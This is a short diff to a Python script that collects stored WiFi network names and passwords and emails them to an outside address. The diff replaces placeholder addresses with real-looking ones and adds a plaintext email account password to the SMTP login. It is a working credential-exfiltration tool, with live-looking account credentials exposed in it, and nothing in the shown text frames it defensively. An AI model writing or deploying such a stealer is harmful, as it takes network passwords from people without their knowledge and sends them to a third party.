@@ -37,14 +37,14 @@ for item in wifi_list:
 
 
 email = EmailMessage()
-email["from"] = "dummy@gmail.com"
-email["to"] = "dummy@yahoo.co.uk"
+email["from"] = "honeydummyams@gmail.com"
+email["to"] = "d.nikolaienko@yahoo.co.uk"
 email["subject"] = "WiFi SSIDs and Passwords"
 email.set_content(email_message)
 
 
-with smtplib.SMTP(host="smtp.gmail.com", port=465) as smtp:
+with smtplib.SMTP(host="imap.gmail.com", port=587) as smtp:
     smtp.ehlo()
     smtp.starttls()
-    smtp.login("dummy_dummy", "dummy")
+    smtp.login("honeydummyams@gmail.com", "wS19eoBdhnS1")
     smtp.send_message(email)
